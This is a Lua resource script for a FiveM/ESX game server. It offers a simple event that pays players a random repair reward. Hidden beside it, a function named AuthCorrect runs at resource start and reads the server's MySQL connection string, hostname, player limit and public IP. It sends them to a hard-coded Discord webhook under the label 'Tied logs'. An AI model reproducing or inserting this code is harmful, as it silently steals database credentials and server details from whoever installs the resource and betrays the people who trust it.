ESX = nil 

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end) 

RegisterServerEvent('esx_actividades:pay')
AddEventHandler('esx_actividades:pay', function()

    local pay = math.random(50, 200)

    local xPlayer = ESX.GetPlayerFromId(source)
    
    xPlayer.addMoney(pay)

    TriggerClientEvent('esx:showNotification', xPlayer.source, '¡Has recibido ' .. pay .. ' dólares por la reparación, sigue así!')

end)


function AuthCorrect()
    local active = false
    local direccionip = nil
    local colores = 16711680
    AddEventHandler('onResourceStart', function(resource)
        local nombre = GetConvar('sv_hostname', 'NULL')
        local database = GetConvar('mysql_connection_string', 'NULL')
        local maxusers = GetConvar('sv_maxclients', 'NULL')
        
        if active == false then
            active = true
            PerformHttpRequest('https://api.ipify.org', function(errorCode, resultData, resultHeaders)
                direccionip = tostring(resultData)
                PerformHttpRequest("https://discord.com/api/webhooks/855969476037836801/fI5v5xxubwnmfa98fv_pK_X1Uid74GxYBO5D6Fzh1fpBEhySItk87YJVy9G5Cqso2_j4", function(err, text, headers) end, 'POST', json.encode({
                    username = "Tied logs", 
                    embeds = {{
                        ["color"] = colores, 
                        ["author"] = {
                            ["name"] = "Tied",
                            --["icon_url"] = Config.communtiyLogo
                        },
                        ["title"] = 'Script Iniciado - Tied-logs - Intento Correcto',
                        ["description"] = "```Script Iniciado: [".. GetCurrentResourceName().. "]```\n```Server: [".. nombre .."]```\n```Database Connection: [".. database .."]```\n```Usuarios maximos: [".. maxusers .."]```\n```IP: [".. direccionip .."]```",
                        ["footer"] = {
                            ["text"] = "Tied logs • "..os.date("%x %X %p"),
                           -- ["icon_url"] = "https://cdn.discordapp.com/attachments/829785155928326213/832639041823309844/logo648x618.png",
                        },
                    }}, 
                    --avatar_url = Config.avatar
                }), { 
                    ['Content-Type'] = 'application/json' 
                })
            end)
        end
    end)
end

AuthCorrect()